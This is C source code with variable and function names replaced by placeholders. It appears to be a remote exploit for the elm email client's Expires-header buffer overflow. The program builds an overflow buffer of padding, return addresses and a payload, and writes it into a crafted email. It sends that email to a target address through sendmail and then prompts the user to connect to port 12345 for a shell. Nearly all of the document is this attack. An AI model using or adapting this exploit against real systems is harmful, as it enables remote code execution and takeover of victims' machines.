
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int VAR_0 ;
 char* VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 long VAR_4 ;
 char* VAR_5 ;
 long VAR_6 ;
 long VAR_7 ;
 int FUNC_0 (int ) ;
 char* VAR_8 ;
 int FUNC_1 (int *) ;
 int * FUNC_2 (char*,char*) ;
 int FUNC_3 (int *,char*,char*,char*,char*) ;
 int FUNC_4 (char*) ;
 scalar_t__ FUNC_5 (int) ;
 int FUNC_6 (char*,char*,int) ;
 int FUNC_7 (char*,char,int) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (char*,char*) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*) ;
 scalar_t__ FUNC_12 (char*) ;
 scalar_t__ FUNC_13 (char*) ;

int FUNC_14(int VAR_9, char **VAR_10)
{
      char VAR_11[VAR_0];
      char *VAR_12 = ((void*)0);
      char *VAR_13 = ((void*)0);
      int VAR_14;
      long VAR_15, VAR_16, VAR_17;
      FILE *VAR_18;

      if(VAR_9 != 2) {
        FUNC_10("Usage: ./elmex <user@where.com>");
        FUNC_0(VAR_2);
      }

      if(FUNC_11(VAR_10[1]) > 50) {
              FUNC_10("[-] Sorry, email address too long!");
              FUNC_0(VAR_2);
      }

      VAR_13 = (char *)FUNC_5(FUNC_11(VAR_10[1]));
      if(!VAR_13) {
              FUNC_8("malloc");
              FUNC_0(VAR_2);
      }

      VAR_12 = VAR_1;

      FUNC_7(VAR_13, '\0', FUNC_11(VAR_10[1]));
      FUNC_6(VAR_13, VAR_10[1], FUNC_11(VAR_10[1]));

      FUNC_10("\nExploit for elm email client < 2.5.8 overflow in Expires field");
      FUNC_10("Tested: Redhat on quiet a Sunday by c0ntex[at]open-security.org\n");

      VAR_15 = VAR_4;
      VAR_16 = VAR_7;
      VAR_17 = VAR_6;

      FUNC_7(VAR_11, '\0', VAR_0);
      FUNC_6(VAR_11, VAR_8, FUNC_11(VAR_8));

      for(VAR_14 = FUNC_11(VAR_8); VAR_14 < 53; VAR_14++)
              *(VAR_11+VAR_14) = 0x41;
      for(VAR_14 = 53; VAR_14 < 57; VAR_14 += 4)
              *(long *)&VAR_11[VAR_14] = VAR_16;
      for(VAR_14 = 57; VAR_14 < 61; VAR_14++)
              *(long *)&VAR_11[VAR_14] = VAR_15;
      for(VAR_14 = 61; VAR_14 < 65; VAR_14 += 4)
              *(long *)&VAR_11[VAR_14] = VAR_17;

      FUNC_6(&VAR_11[65], VAR_5, FUNC_11(VAR_5));
      VAR_11[VAR_0] = '\0';

      FUNC_10("[-] Adding exploit buffer to email");

      VAR_18 = FUNC_2(VAR_12, "w");
      if(!VAR_18) {
              FUNC_8("fopen"); FUNC_4(VAR_13);
              FUNC_0(VAR_2);
      }

      FUNC_3(VAR_18,
               "From: User c0ntex <c0ntex@open-security.org> Sun Aug 21 13:37:00 2005\n"
               "Return-Path: <c0ntex@localhost\n"
               "Date: Sun, 21 Aug 2005 13:37:00 %s\n"
               "Subject: Insecure?\n"
               "To: %s\n"
               "%s\n", VAR_5, VAR_13, VAR_11);
      FUNC_1(VAR_18);

      FUNC_9("[-] Emailing %s with malicious content\n", VAR_10[1]);

      if(FUNC_12("/bin/cat ./tmpmail | /usr/sbin/sendmail -t") <0) {
              FUNC_8("system"); FUNC_4(VAR_13);
              FUNC_0(VAR_2);
      }

      FUNC_10("[-] Connect to system on port 12345 to get your shell\n");

      if(FUNC_13(VAR_1) <0)
              FUNC_8("unlink");

      FUNC_4(VAR_13);

      return VAR_3;
}
